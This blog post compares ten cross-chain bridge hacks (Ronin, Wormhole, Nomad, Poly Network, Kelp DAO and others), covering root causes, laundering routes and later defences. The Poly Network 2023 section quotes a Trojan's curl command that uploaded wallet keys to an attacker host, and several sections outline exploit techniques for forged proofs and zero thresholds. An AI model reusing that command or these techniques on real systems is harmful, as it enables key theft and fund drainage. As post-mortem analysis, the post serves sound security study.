---
layout: post
title: "Cross-Chain Bridge Hacks - Ten Incidents, Five Failure Classes"
date:   2026-07-31
lang: en
locale: en-GB
categories: blockchain security defi
tags: BA-bridge cross-chain bridge exploit ronin poly-network wormhole nomad layerzero post-mortem validator supply-chain
description: A comparative analysis of ten major cross-chain bridge exploits between 2021 and 2026, grouped into five failure classes, covering the architecture of each bridge, the root cause of each failure, and the destination of the stolen funds.
image: /assets/article/blockchain/defi/cross-chain-bridge/2026-07-31-cross-chain-bridge-hacks-mindmap.png
isMath: false
---

Cross-chain bridges concentrate value in a way few other components of a blockchain system do. A bridge holding the escrow for several chains is, in practice, a custodian, and the contract that releases those assets answers to an off-chain attestation layer rather than to the consensus of either chain. Between 2021 and 2026 that arrangement produced a steady run of nine and ten figure losses.

This article works through ten of them. They are grouped by what actually failed rather than by date, because the same headline ("bridge drained") covers at least five distinct engineering problems, and the controls that stop one of them do nothing against the others.

> This article has been made with the help of [Claude Code](https://claude.com/product/claude-code) and several custom skills

[TOC]

## How a Cross-Chain Bridge Works

A bridge moves value in three steps. A user commits an asset on the origin chain, either by locking it in escrow or by burning it. An off-chain layer observes that commitment and attests to it. A contract on the target chain verifies the attestation and releases the corresponding asset to the recipient.

Designs differ mainly in the middle step:

- **Threshold signatures.** A fixed set of validators, keepers or bridge operators each sign a withdrawal, and the target contract counts signatures against a threshold. Ronin, Harmony Horizon and Poly Network work this way.
- **Relay chain.** Cross-chain events are committed to an intermediate chain whose consensus nodes sign the resulting block header. The target chain verifies a Merkle proof against the signed state root. This is Poly Network's design.
- **Light client.** The target chain verifies origin chain block headers directly, in contract code. Harmony's Horizon repository contains such a design, and the BSC Token Hub uses a Tendermint light client with proof verification in a precompile.
- **Configurable verifier networks.** The application chooses which independent verifiers must attest, and how many. LayerZero V2 works this way, and Kelp DAO configured it with exactly one.

![Lock/unlock bridge architecture and its trust anchor]({{site.url_complet}}/assets/article/blockchain/defi/cross-chain-bridge/2026-07-31-cross-chain-bridge-lock-unlock-concept.png)

Whatever the middle step looks like, the target chain contract performs the same operation: it decides whether an incoming message is authentic, using only what the message carries. It has no independent view of the origin chain. Everything below follows from that.

## Summary of the Ten Incidents

The table below orders the incidents by date. The failure class column is the organising principle for the rest of the article.

| Incident | Date | Loss | Trust model | Root cause | Failure class |
|---|---|---|---|---|---|
| Poly Network | 10 Aug 2021 | ~$600M, almost all returned | Keeper-signed headers | Selector collision let a cross-chain message overwrite the keeper list | Verification logic |
| Wormhole | 2 Feb 2022 | 120,000 wETH (~$320M) | 19 guardians, 2/3 quorum | `load_instruction_at` accepted a forged sysvar account | Verification logic |
| Ronin | 23 Mar 2022 | 173,600 ETH + 25.5M USDC (~$540M) | 5-of-9 validators | Spear-phishing for four keys, a stale allowlist for the fifth | Trust anchor |
| Harmony Horizon | 23 Jun 2022 | ~$100M | 2-of-4 multisig | Phishing a developer, then backdoor access to bridge servers | Trust anchor |
| Nomad | 1 Aug 2022 | $156M–$190M | Optimistic, committed roots | An upgrade set the trusted root to `0x00`, so every message read as proven | Verification logic |
| BSC Token Hub | 7 Oct 2022 | 2,000,000 BNB (~$600M) | Tendermint light client | The IAVL proof verifier ignored the `right` attribute of path nodes | Verification logic |
| Multichain | Jul 2023 | ~$125M | MPC nodes | The CEO held sole custody and was arrested; no exploit primitive is known | Trust anchor |
| Poly Network | 2 Jul 2023 | notional ~$34B, realised far less | 3-of-4 keepers, 2f+1 relay chain | Trojan in the build environment exfiltrated the consensus keys | Supply chain |
| Ronin | 6 Aug 2024 | 3,996 ETH + 1,998,046 USDC (~$12M) | 22 operators, 70% | An upgrade skipped `initializeV3`, leaving the vote weight threshold at zero | Deployment |
| Kelp DAO / LayerZero | 18 Apr 2026 | 116,500 rsETH (~$292M) | 1-of-1 DVN verifier | RPC poisoning plus a DDoS-forced failover made the sole verifier attest to a burn that never happened | Origin-chain view |

Several loss figures are disputed between sources, usually because one measures the value at the moment of theft and another the value when the theft was announced. Where that matters, the section below says which basis is being used.

## Class 1: Defects in the Verification Logic

Four of the ten involved a genuine bug in code that a reviewer could have read. This is worth stating plainly, because the better-known bridge incidents are the ones where the code was correct, and that creates an impression that bridge security is entirely an operational problem. It is not.

### Poly Network 2021: a function selector collision

Poly Network's `EthCrossChainManager` is the owner of `EthCrossChainData`, the contract holding the list of keeper public keys. Any call the manager makes to the data contract is therefore privileged.

The manager also executes arbitrary cross-chain messages by dispatching on a four-byte function selector. [Kudelski's analysis](https://kudelskisecurity.com/research/the-poly-network-hack-explained) reconstructs what the attacker did with that. The selector for `putCurEpochConPubKeyBytes(bytes)` is `0x41973cd9`. The attacker brute-forced a different signature, `f1121318093(bytes,bytes,uint64)`, whose keccak hash begins with the same four bytes.

Submitting a cross-chain transaction naming that second signature caused the manager to call `putCurEpochConPubKeyBytes` on the data contract, which obediently registered the attacker's own public key as a keeper. From that point the attacker held the signing key for the bridge and drained the liquidity wallets on Ethereum, then repeated the exercise on Binance Chain, Neo and elsewhere.

Roughly $600M moved, which made it the largest crypto theft to that date. Almost all of it came back, after a negotiation conducted in public through on-chain messages. [TRM Labs tracked it live](https://www.trmlabs.com/resources/blog/trm-tracks-the-poly-network-hack-as-attacker-communicates-in-real-time): an onlooker using the ENS name `hanashiro.eth` warned the attacker that their USDT had been blacklisted, and received 13.37 ETH, worth over $42,000 at the time, as thanks. Within hours of the theft over $96M of USDC on Ethereum had been swapped for DAI, and nearly $120M of USDC and BNB on Binance Smart Chain had been deposited with a fork of the same exchange.

The lesson is narrow and mechanical. A dispatcher that routes untrusted input to a privileged callee must constrain which functions can be reached, and four bytes of a hash is not a namespace.

### Wormhole 2022: an unchecked account

Wormhole's Solana program verified guardian signatures in `verify_signatures`, which read the transaction's other instructions through `load_instruction_at`:

```rust
let secp_ix = solana_program::sysvar::instructions::load_instruction_at(
    secp_ix_index as usize,
    &accs.instruction_acc.try_borrow_mut_data()?,
)
```

The account supplying that data is passed in by the caller. `load_instruction_at` does not check that it is the real instructions sysvar. The attacker created their own account holding fabricated instruction data, so every entry in the resulting `signature_set` was marked valid. `post_vaa` then counted those entries, found the 2/3 guardian quorum satisfied, and produced a legitimate Validator Action Approval authorising a mint.

At 18:24 UTC on 2 February 2022 the attacker minted 120,000 wETH on Solana, and four minutes later moved 80,000 of it across to Ethereum. Kudelski puts the total at $324M; Merkle Science's contemporaneous figure is over $320M.

The timeline is the part worth carrying forward. Solana deprecated `load_instruction_at` on 20 October 2021. Wormhole committed to updating its Solana dependency on 13 January 2022. The pull request containing that update was opened at 17:31 UTC on 2 February. The mint transaction followed at 18:24, fifty-three minutes later. The fix was public before it was deployed, and someone was reading.

### Nomad 2022: a trusted root of zero

Nomad's replica contract proved inbound messages against a set of committed Merkle roots. A routine upgrade initialised the trusted root value to `0x00`. As [Mandiant records](https://cloud.google.com/blog/topics/threat-intelligence/dissecting-nomad-bridge-hack), quoting Halborn, that value is also what the contract used to mean "not a trusted root", so every message was automatically viewed as proven. Anyone could construct a message, call `process()` directly, and have it executed with no validation at all.

The first exploiter turned 0.1 WBTC into 100 WBTC, worth $2.3M. Because the transaction sat in plain view on block explorers and required no skill to copy, the rest became a free-for-all. Elliptic counted more than 40 exploiters and over 200 malicious contracts, with the most prolific participant deploying 202 of them for just under $42M. By midday on 2 August the Nomad contract held $15,000.

Nomad offered attackers 10% of what they held and no legal action if they returned the other 90%, plus a whitehat NFT. Mandiant records $36M of the $190M returned. Elliptic's figure at the time was $156.4M stolen and $16M returned; the higher $190M appears in the US Department of Justice case that led to a key suspect being extradited in 2025.

Two properties made this the most chaotic incident of the ten. The exploit needed no privileged position, and it was infinitely repeatable by observers. Neither is true of any other case here.

### BSC Token Hub 2022: a Merkle proof with an unused field

The BSC Token Hub bridges BNB Beacon Chain and BNB Chain. A relayer calls `handlePackage()` with a payload and an IAVL Merkle proof, and a native Geth precompile verifies the proof against the light client's app hash. Becoming a relayer requires depositing 100 BNB, which the attacker duly did.

IAVL trees differ from the more familiar sorted-pair construction. Rather than deciding concatenation order by comparing sibling values, IAVL path nodes carry explicit `left` and `right` attributes that record which side a sibling belongs on. As [Immunefi's analysis](https://medium.com/immunefi/hack-analysis-binance-bridge-october-2022-2876d39247c1) sets out, the verifier derived the root hash without ever using the `right` attribute, and the proof is entirely under the caller's control.

That combination is the whole exploit. The attacker took the proof from the bridge's very first cross-chain transaction, appended a new leaf carrying their own payload plus an empty inner node, and placed the hash of that malicious leaf in the unused `right` attribute. The derived root still matched the legitimate signed root, so verification passed, and the payload authorised the release of 2,000,000 BNB. Immunefi's proof of concept confirms it by printing identical root hashes for the legitimate and forged proofs.

Contemporaneous loss figures vary: Immunefi says about $600M, The Defiant's headline says $560M, and Mandiant gives ~$568M. Most of it never left the chain, which Binance halted, adding a blacklist mechanism before restarting.

The patch is unusually legible, because the node software is open source and both versions are available. Between v1.1.14 and v1.1.16, nineteen files change. The load-bearing ones are:

- `core/vm/contracts_lightclient.go` gains `iavlMerkleProofValidateNano` and `tmHeaderValidateNano`, both of which simply return an error reading `"suspend"`. The vulnerable precompiles were switched off rather than repaired. A later `iavlMerkleProofValidateMoran` re-enables the functionality around a shared `basicIavlMerkleProofValidate`.
- `core/vm/lightclient/types.go` adds a `verifiers` field to `KeyValueMerkleProof`, together with a `SetVerifiers` method, and threads those verifiers through into `VerifyAbsence` and `VerifyValue`. In v1.1.14 both were called with no verifier constraints whatsoever.
- `core/types/blacklist.go` is new.

Immunefi's conclusion is that both sides of the attribute have to be accounted for when computing the root hash. The more general reading is that any field a caller controls and the verifier ignores is a field the caller can use to smuggle data past the verifier.

## Class 2: Compromise of the Trust Anchor

In this class the contracts are correct and execute correctly. What the attacker takes is the ability to produce authorisations that the contract is obliged to honour.

### Ronin 2022: validator key compromise

At the time of the breach the Ronin bridge relied on nine validator nodes, five of which had to approve a withdrawal. Four were operated by Sky Mavis and one by the Axie DAO, with the remainder distributed. The split was deliberate: no single organisation was supposed to hold a majority, so compromising Sky Mavis alone should not have been sufficient.

The attackers began with a spear-phishing campaign against Sky Mavis employees. One employee was compromised, and that access was used to move laterally into the internal infrastructure that hosted the validator nodes. Four validator keys followed.

The fifth signature is the interesting part. In November 2021 Sky Mavis had asked the Axie DAO for help absorbing a surge in user traffic, and the DAO allowlisted Sky Mavis to sign transactions on its behalf through a gas-free RPC node. The arrangement ended in December 2021, but the allowlist entry was never revoked. Once inside Sky Mavis systems, the attackers used that stale permission to obtain the Axie DAO validator's signature, reaching the 5-of-9 threshold.

The distinction between nominal and effective decentralisation matters here. On paper, reaching the threshold required five separately operated validators. In practice, a single compromised corporate network plus a forgotten configuration entry produced all five. Sky Mavis's own post-mortem is explicit that this was social engineering rather than a technical flaw.

**Detection.** The withdrawals were executed in two transactions on 23 March 2022. They were discovered on 29 March, six days later, and only because an unrelated user's 5,000 ETH withdrawal failed. Sky Mavis stated plainly that no system existed for monitoring large outflows from the bridge. The six-day gap did not increase the amount taken, since the drain completed in two transactions, but it removed any possibility of intervention: by the time anyone looked, the assets had been gone for almost a week. A value cap or a delayed-withdrawal window would have bounded the damage regardless of how many keys the attackers held.

**Where the money went.** Elliptic tracked the laundering, and the pattern is characteristic of the group later named by the US Treasury:

- **USDC swapped to ETH on decentralised exchanges first.** Stablecoin issuers can freeze tokens; the swap removed that risk before anything else was attempted, and avoided AML and KYC checks at centralised venues.
- **Roughly $16.7M of ETH routed through three centralised exchanges.** This is unusual for a DeFi exploit given those exchanges' reporting obligations, though it matches earlier Lazarus-affiliated activity.
- **A pivot to Tornado Cash once those exchanges announced cooperation with law enforcement.** Around $80.3M of ETH had passed through the mixer by mid-April 2022, with a further $9.7M staged in intermediary wallets.
- **The bulk left untouched at that point.** Approximately $433M remained in the original attacker wallet as of 14 April 2022, with Elliptic assessing about 18% of the total as laundered.

At the time it was the second largest crypto theft on record. Elliptic notes that Lazarus Group had been targeting crypto entities since at least 2017, but that the focus had shifted: until 2021 most of that activity was aimed at centralised exchanges in South Korea and elsewhere in Asia, and in the preceding year it had turned towards DeFi services. Sky Mavis, based in Vietnam, fits the geographic pattern of earlier targets even though the bridge itself is decentralised.

On 14 April 2022 OFAC sanctioned the receiving Ethereum address and named [Lazarus Group](https://www.elliptic.co/blog/540-million-stolen-from-the-ronin-defi-bridge), the North Korean state hacking organisation, as its owner. Sky Mavis stated that user funds would be made whole from a funding round, Axie Infinity and Sky Mavis balance sheet assets, and personal funds from the core team, so the loss fell on the company rather than on bridge users.

### Harmony Horizon 2022: a predicted failure

Horizon connected Harmony to Ethereum and Binance Smart Chain. Harmony's own summary states that the perpetrators compromised at least two of four bridge validator private keys, which was the whole threshold. Elliptic's write-up quotes contemporaneous commentary describing it as 2-of-5; Harmony's number is the one used here.

Starting at 11:06:46 UTC on 23 June 2022, fourteen transactions across Ethereum and Binance Smart Chain moved fourteen bridged assets, including USDC, ETH, USDT and BNB, into a previously unrecognised account. Elliptic valued the haul at $99.7M. The funds were swapped to ETH through decentralised exchanges and then routed into Tornado Cash.

Harmony's reconstruction is a textbook intrusion chain rather than a contract exploit. Phishing tricked at least one software developer into installing malicious software on their laptop. That gave the attackers the ability to read chat threads describing how the bridge was operated, access to non-public bridge infrastructure code, and eventually backdoor access to one or more servers. A trojan install occurred as recently as 17 June. Separately, on 18 June the team found a vulnerability in packages bundled with their internal subgraph service that exposed every server address inside their private cloud, and were still fixing it when the bridge was drained five days later. Server logs suggest the attackers had been studying the Horizon implementation since 2 June.

Around 64,000 wallets were affected, roughly 50,000 of them belonging to bridged wallet owners. Harmony offered a $1M bounty, raised it to $10M, and received no legitimate response.

Two details make this case worth including. Harmony's website described the bridge as fully audited, which was true and irrelevant, because nothing in the audited code failed. And the failure had been predicted in public: on 1 April 2022, twelve weeks before the theft, a widely circulated thread pointed out that compromising two of four multisig signers would produce a nine-figure loss and asked how those externally owned accounts were secured.

### Multichain 2023: custody without an exploit

Multichain is here as the boundary case. In July 2023 roughly $125M moved out of the protocol's contracts to unknown addresses. Chainalysis titled its analysis with the open question, describing mysterious withdrawals that suggested either a multi-million dollar hack or a rug pull. No exploit primitive has ever been published.

What emerged instead was the custody arrangement. Multichain announced on 14 July 2023 that it was ceasing operations, confirming that its CEO, known as Zhaojun, had been in police custody in China since 21 May. All of his computers, phones, hardware wallets and mnemonic phrases had been confiscated. Since the project began, all operational funds, investor funds and server access had been under his control alone. His sister had helped the team with server maintenance during his detention, and was then also taken into custody, holding $220M of project funds at the time.

A Singapore court later ordered Multichain to pay $2.2M to the Fantom Foundation, a ruling that DL News reported as deepening rather than settling suspicion about where the money went.

For a threat model, the useful observation is that the operational reality (one person, one set of devices, one jurisdiction) was not visible from the protocol's published architecture, which described a network of MPC nodes. Counting nodes measured nothing.

## Class 3: The Software Supply Chain

### Poly Network 2023: a Trojan in the build environment

**Architecture.** Poly Network routes every cross-chain transaction through its own relay chain. A user locks assets on the origin chain via a LockProxy contract; the event is submitted to the relay chain, which produces a cross-chain proof; that proof, consisting of a signed relay chain block header and a Merkle proof, is submitted to the target chain to unlock the assets. On the target chain, `verifyHeaderAndExecuteTx` checks the header signatures against a fixed keeper list and then verifies the Merkle path against the state root carried in the header.

**Cause.** [Dedaub's post-mortem](https://dedaub.com/blog/poly-network-hack/) reconstructed the attack and found no fault in the contracts. `verifySig` was invoked correctly, the header genuinely carried three valid keeper signatures satisfying the k-1 of k scheme, and the keeper list had not been modified in two years. The Merkle prover behaved as specified. There was no logic bug to exploit, because the attacker did not need one. The keepers had signed a state root that the attacker constructed.

Dedaub did flag one implementation characteristic worth carrying into any bridge review. The Merkle verifier accepts a zero-length witness: an attacker can submit the leaf alone, with an empty path, in which case the leaf hash must itself equal the signed root. That is consistent with the algorithm, but it means a signed root places no structural constraint whatsoever on what can be authorised. Here the attacker passed a 240-byte leaf whose only content was an unlock command directed at their own address.

Dedaub could not distinguish stolen keys from compromised keeper software or an outright rug pull, since all three look identical on-chain. Poly Network's own analysis, published in November 2023, supplied the answer.

**The Trojan.** Poly Network reviewed the relay chain consensus logic and found no vulnerability. Attention turned to how the consensus keys themselves could have been obtained. Sandbox testing of the running mainnet binaries surfaced an unexplained TCP connection to `199.188.201.24`, resolved from the domain `pypa.tech`, an address with a history as Trojan command-and-control infrastructure.

Decompilation revealed a malicious code block in the program's startup path. On launch it read the local wallet file and keys and uploaded them by invoking `os/exec.Command` to run `curl -F xxx https://pypa.tech/xxx`. The team confirmed the mechanism by replacing the local `curl` binary and observing the call. Tracing the implantation path showed that the attackers had targeted the **program compilation environment**, with the Trojan inserted during or before the build.

This is why the multi-party structure provided no protection. The consensus nodes were operated by different parties, but the software they all ran was compiled in one place and distributed to everyone. One compromised build host produced a compromised binary for the entire set, which is how 2f+1 keys reached a single attacker.

**The forged transaction.** The official analysis gives a worked example for ETH that shows the mechanism cleanly. A legitimate cross-chain transaction locked **0.000000000000001 ETH** on BNB Chain, recorded on the relay chain at block height 30307916. The transaction executed on Ethereum released **1592.51818168432 ETH**, and cited a relay chain block at height 30150181 whose hash corresponds to no block on the real relay chain. The attackers signed a header for a chain state that never existed, then let the target chain verify it exactly as designed. The exploit affected 58 assets across 11 blockchains over 136 transactions, and Poly Network took roughly seven hours to react.

**Where the money went.** The proceeds were consolidated into a small number of addresses. On Ethereum the attackers used `0xe0Afadad1d93704761c8550F21A53DE3468Ba599`, `0x8E0001966e6997db3e45c5F75D4C89a610255b2E` and `0xdddE20a5F569DFB11F5c405751367E939ebC5886`. The first of those three was reused across BNB Chain, OKX, Heco, Polygon, Optimism, Avalanche, Arbitrum, Andromeda, Fantom and Gnosis.

The headline figure requires a caveat that Dedaub supplied at the time: the notional value of around $34B never corresponded to realisable value, because most of the affected tokens were illiquid. What an attacker can actually extract from a bridge is bounded by the depth of the markets for the assets it holds, not by the sum printed on a dashboard.

Neither Poly Network's analysis nor its remediation post documents a recovery, and neither states how much was ultimately realised or where it was moved. Comments left on the official post-mortem as late as August 2025 report that assets bridged to Ontology through Poly Network remain lost. On the question of final destination, this incident is the least well documented of the ten.

## Class 4: Deployment and Upgrade Procedure

### Ronin 2024: uninitialized vote weight

**Architecture.** By 2024 the redesigned Ronin bridge was operated by 22 bridge operators, with at least 70% approval required to execute a withdrawal. It uses the Transparent Upgradeable Proxy pattern, so the implementation can be replaced by a `ProxyAdmin` while ordinary calls are forwarded to the current implementation.

**Cause.** On 6 August 2024 at 08:48:47 UTC the team upgraded the proxy twice, moving from version 2 to version 4 and introducing two new initializers, `initializeV3` and `initializeV4`. During the upgrade only `initializeV4` ran. `initializeV3` was skipped, and the storage variable `_totalOperatorWeight` was left at its default value of zero.

Earlier versions of the bridge read the total weight from the bridge manager at call time. In the pre-upgrade source, `MainchainGatewayV3` implements it as a plain external call:

```solidity
function _getTotalWeight() internal view override returns (uint256) {
  return IBridgeManager(getContract(ContractType.BRIDGE_MANAGER)).getTotalWeight();
}
```

The new implementation stores the value instead, so nothing at runtime compensated for the missing initializer. The consequence propagates directly into the withdrawal path.

![Ronin 2024 exploit workflow]({{site.url_complet}}/assets/article/blockchain/defi/cross-chain-bridge/2026-07-31-ronin-2024-uninitialized-weight-workflow.png)

An attacker contract called `submitWithdrawal` on `MainchainGatewayV3`. That reaches `_submitWithdrawal`, which calls `_computeMinVoteWeight` to obtain the minimum weight and the locked flag. `_computeMinVoteWeight` calls `_getTotalWeight`, which returned zero, so `_minimumVoteWeight` also returned zero and `minimumWeight` was set to zero. With both the submitted `weight` and `minimumWeight` equal to zero, the threshold check passed, `passed` was set to true, and `handleAssetOut` executed `send()`. Any signature satisfied cross-chain verification, including none at all.

An MEV bot observed the upgrade transaction in the mempool, and the attack executed at 09:37:23 UTC, **48 minutes after the upgrade**. Halborn adds that the bot front-ran other, manual attempts at the same exploit, and that the amounts taken were the maximum withdrawable in a single transaction. Three Sigma notes that the contract had been deployed without an audit, so the misconfiguration was found by a mempool watcher rather than by a reviewer.

**Where the money went.** This is the one case where the destination is straightforward. Two MEV bot addresses extracted the funds: `0x4ab12e7ce31857ee022f273e8580f73335a73c0b` took 3,996 ETH, worth about $10M at the time, and `0x6980a47beE930a4584B09Ee79eBe46484FbDBDD0` took 1,998,046 USDC. The exploited contract was Ronin Bridge v2 at `0x64192819ac13ef72bf6b5ae239ac672b43a9af08`.

The operator turned out to be a whitehat. The contract was paused at 10:15:23 UTC, 38 minutes after the exploit, and the SEAL 911 group of security professionals assisted with the return. The ETH was returned the same day and the USDC shortly after; the whitehats received a $500K bounty, and Ronin announced an audit before reopening. The researchers had no guarantee of any payment when they started, which is the incentive structure that pushes whitehats towards acting first and negotiating afterwards.

## Class 5: A Poisoned View of the Origin Chain

### Kelp DAO and LayerZero 2026: attacking what the verifier reads

**Architecture.** Kelp's rsETH moves between chains as a LayerZero V2 Omnichain Fungible Token. LayerZero does not impose a security configuration; each application chooses which Decentralized Verifier Networks must attest to its inbound messages, and how many. LayerZero's published guidance is to require at least two independent DVNs, and it says three to five is better.

Kelp's rsETH pathway was configured **1-of-1**, with the LayerZero Labs DVN as the sole verifier. One party decided whether an incoming message was genuine, and there was no second attestation that could disagree with it.

**Cause.** The attack did not target the protocol, the DVN software or its keys. It targeted the data the verifier reads.

According to [LayerZero Labs' incident report](https://layerzero.network/blog/layerzero-labs-kelpdao-incident-report), the intrusion began on 6 March 2026, when an attacker socially engineered a LayerZero Labs developer, harvested session keys and pivoted into the RPC cloud environment. They swapped the binaries of two internal op-geth nodes running on separate clusters and patched the running RPC memory. The implanted payload was selective: it returned tampered responses to the DVN alone, and truthful ones to every other caller, including the monitoring and indexing services that would otherwise have noticed the divergence. It was built to self-destruct once the attack was no longer possible, deleting the binary, the local logs and the configuration.

That still was not enough, because the DVN read from internal and external RPC nodes in combination. So the attackers ran a denial of service attack against the external provider. The DDoS ran from 10:20 to 11:40 Pacific time, and the failover it triggered put the DVN exclusively on the two poisoned internal nodes.

![Kelp DAO 2026 RPC poisoning workflow]({{site.url_complet}}/assets/article/blockchain/defi/cross-chain-bridge/2026-07-31-kelp-dao-rpc-poisoning-workflow.png)

**The forged message.** At 17:35 UTC on 18 April 2026 the Ethereum endpoint accepted inbound nonce 308 and released 116,500 rsETH, approximately $292M, from the `RSETH_OFTAdapter`. Unichain's outbound nonce was still 307. The source-side burn the message described had never happened.

Within minutes the attacker dispersed the rsETH across seven recipient addresses and put 89,567 of it into eight Aave V3 positions on Ethereum Core and Arbitrum, borrowing 82,650 WETH and 821 wstETH against it and holding health factors between 1.01 and 1.03. Aave's Protocol Guardian froze rsETH and set its loan-to-value to zero at 19:00 UTC, and Kelp paused 43,373 rsETH between 18:00 and 19:00.

Mandiant, CrowdStrike and independent researchers attribute the intrusion to the DPRK threat actor TraderTraitor, also tracked as UNC4899.

**Where the money went.** Unusually for this list, the backing was restored. Aave Labs convened an industry recovery effort that grew to around $300M in commitments. Aave governance liquidated the eight attacker positions on 6 May, Kelp burned the liquidated rsETH on Arbitrum on 12 May, and the adapter was refilled in five tranches totalling 116,131.72 rsETH by 26 May, at which point rsETH backing was whole again. The Arbitrum Security Council separately froze 30,766 ETH linked to the attacker, which then became the subject of a restraining notice in an unrelated federal matter and a court-supervised transfer.

**Responsibility.** All three parties have published, and they do not agree. LayerZero states that Kelp chose a 1-of-1 configuration despite explicit written recommendations to the contrary. Kelp states that the compromised verification infrastructure sat outside its operational domain and is run by a third party. LayerZero separately concedes that it erred by letting its own DVN act as a sole attestor for high-value transactions, and has since changed that: the LayerZero Labs DVN now refuses to sign as the only required verifier on any channel, and Endpoint v2 pathway defaults have moved to a minimum 3-of-3 configuration.

**Why this is its own class.** In every other incident here, the attacker either broke the verification code or obtained the credentials that the verification code trusts. Here they did neither. The verifier's software was sound, its keys were never compromised, and least-privilege controls kept the attacker out of the DVN instances themselves. What the attacker changed was the verifier's picture of the source chain.

The redundancy point deserves emphasis, because it is the part most likely to be repeated elsewhere. LayerZero had already built the obvious control. Multiple independent RPC sources were in place precisely so that no single one could mislead the verifier. It failed because degrading the honest sources was enough: taking the external provider offline caused an automatic failover onto the attacker's nodes. Redundancy that fails open is not redundancy. The control has to fail closed, refusing to attest when the set of agreeing sources drops below what the design assumed.

## What the Ten Cases Have in Common

**Roughly half were code bugs, and half were not.** Poly Network 2021, Wormhole, Nomad and BSC Token Hub turned on defects a reviewer could find by reading the source. Ronin 2022, Horizon, Multichain, Poly Network 2023 and Kelp DAO did not. Ronin 2024 sits in between: the defect was visible in the deployment transaction rather than the contract. A bridge review scoped to the repository addresses about half the historical loss.

**The trust anchor is the attack surface, not the verifier.** Where the code was correct, a verifier that checks signatures against a signing set delegates its entire security to that set. Auditing the Solidity would have found nothing in Ronin 2022, Poly Network 2023, Horizon or Kelp DAO.

**Nominal decentralisation is not real decentralisation.** A 5-of-9 threshold, a 3-of-4 keeper scheme, a 2-of-4 multisig, a network of MPC nodes and a 1-of-1 verifier all present as distributed trust. Shared IT infrastructure, a forgotten allowlist entry, a shared build pipeline, one person's confiscated hardware wallet, and a single configuration choice each collapsed one into a single failure domain. The question to ask of a threshold is not how many signers there are, but how many independent failure domains they occupy.

**The build pipeline is part of the protocol.** Poly Network 2023 was compromised before any Solidity executed. Reproducible builds, verified independently by each participant, are a bridge security control in exactly the same sense that a signature check is.

**The signer's input is part of the protocol too.** Kelp DAO extends the same argument one step further out. A verifier's honesty is bounded by the honesty of its data feed, and the data path underneath an attestation layer rarely appears in an audit scope.

**Upgrades and disclosures are the peak-risk moments.** Ronin 2024 was exploited within the hour by a bot watching the mempool. Wormhole was exploited fifty-three minutes after the pull request containing its fix appeared in public. Nomad's zero root arrived in an upgrade. Every parameter that a new implementation reads from storage must be initialised by the upgrade that introduces it, and a fix that is public before it is deployed is a disclosure.

**Protocols get hit twice, by different routes.** Dedaub records that Poly Network had already been attacked in 2021, roughly two years before the supply chain incident, and Ronin's 2024 exploit followed its 2022 breach. In neither case did the second attack reuse the first one's route. A bridge that has been drained once is a demonstrated target, and remediating the specific vector that was used does not reduce the incentive to look for the next one.

**Detection latency decides whether a loss can be contained.** Six days for Ronin 2022, seven hours for Poly Network 2023, roughly 85 minutes before the first protective freeze in the Kelp case, 48 minutes for Ronin 2024, and no meaningful window at all for Nomad, where the exploit was self-service. Only the shortest of those left any room to intervene.

**Outcomes are decided off-chain.** Poly Network 2021 and Ronin 2024 were returned voluntarily. Ronin 2022 was covered by the company's balance sheet. Kelp DAO was restored by a coordinated industry recovery. Horizon, Multichain and Poly Network 2023 were not recovered. Nothing on-chain determined any of these outcomes.

## Defensive Measures Adopted After the Incidents

Sky Mavis expanded the validator set from 9 to 11, targeting 21 and then over 100, added a validator dashboard requiring human approval for large withdrawals, moved to a zero-trust internal model with work-only devices and mandatory training, opened a bug bounty of up to $1M, and committed to audits and ISO 27001 certification.

Poly Network's response splits into two halves. On the build pipeline, it added audited fine-grained access control on the source repositories, required **every party to compile independently and compare binary hashes** before starting processes, standardised the compile environment using containers so that the comparison is meaningful, and isolated and audited the build machines. On the bridge itself, it deployed monitoring that scans every relay chain transaction and verifies it against the origin chain, and every target chain transaction against the relay chain, with any mismatch (for instance `StorageAt(ID) != Keccak256(MakeTxParam)`) triggering an automatic contract shutdown. Its planned reinforcements all sit on the target chain as the final checkpoint: per-transaction value caps above which manual approval is required, a lock-up period during which the monitor can challenge a transaction before the user actively claims, and per-token daily limits that suspend the route when exceeded.

Binance disabled the vulnerable precompiles outright before repairing them, and added a blacklist so that stolen balances could be immobilised on a chain it could halt.

LayerZero changed its operating stance rather than its protocol. Its DVN will no longer sign as the sole required attestor on any channel, whatever an application configures, and Endpoint v2 pathway defaults moved to a minimum of three verifiers. The compromised cloud environment was rebuilt rather than patched, with no credentials or configuration carried over, and privileged access now requires just-in-time elevation and multi-person review.

Harmony reduced its cloud attack surface, decoupled access to bridge nodes, and rotated the multisig signers on its unaffected Bitcoin bridge before draining it and taking it offline.

The teams arrived at overlapping conclusions from different starting points. A rate limit, a withdrawal delay with a challenge window, and an independent reconciliation monitor would have bounded the loss in almost all of these incidents, without requiring anyone to correctly predict which attack was coming.

## Conclusion

Ten incidents across five years cover five distinct failure domains: verification logic, key custody and the people around it, the software supply chain, deployment procedure, and the data an attestation layer reads about the origin chain. Only the first is fully addressed by reading the contract source, and it accounts for roughly half the incidents and rather less than half the value.

For anyone reviewing a bridge, the practical consequence is that scope determines usefulness. The key custody model, the number of genuinely independent failure domains behind a threshold, the provenance of the binaries the signers run, the procedure used to upgrade the gateway, and the RPC infrastructure the attestation layer depends on all sit inside the trust boundary. The mitigations that recur across these post-mortems are largely independent of the attack: value caps, daily limits, a delay before assets can be claimed, and continuous reconciliation between chains limit the loss whether the attacker forged a proof, stole a key, backdoored a build, found the threshold already set to zero, or poisoned what the verifier could see.

![Cross-chain bridge hacks mindmap]({{site.url_complet}}/assets/article/blockchain/defi/cross-chain-bridge/2026-07-31-cross-chain-bridge-hacks-mindmap.png)

## Annex

### Key Terms

| Term | Definition |
|------|------------|
| **Lock/unlock bridge** | A bridge where assets are held in escrow on the origin chain and an equivalent amount is released on the target chain, rather than being burned and re-minted. |
| **Bridge operator / validator** | An off-chain participant that observes lock events and signs withdrawal authorisations; a threshold of their signatures allows the target chain to release funds. |
| **Keeper** | In Poly Network's terminology, an externally owned account controlled by the team whose signature on a block header attests to relay chain state. |
| **Guardian** | In Wormhole's terminology, a member of the signing set whose collective 2/3 quorum produces a Validator Action Approval authorising a mint. |
| **DVN (Decentralized Verifier Network)** | In LayerZero V2, an independent party that attests to the validity of a cross-chain message. Each application configures which DVNs are required and how many. |
| **OFT adapter** | The LayerZero contract that holds the escrowed supply of an omnichain token on a given chain and releases it when an inbound message is verified. |
| **Relay chain** | An intermediate chain, used by Poly Network, that records cross-chain events and produces the signed header and Merkle proof consumed by the target chain. |
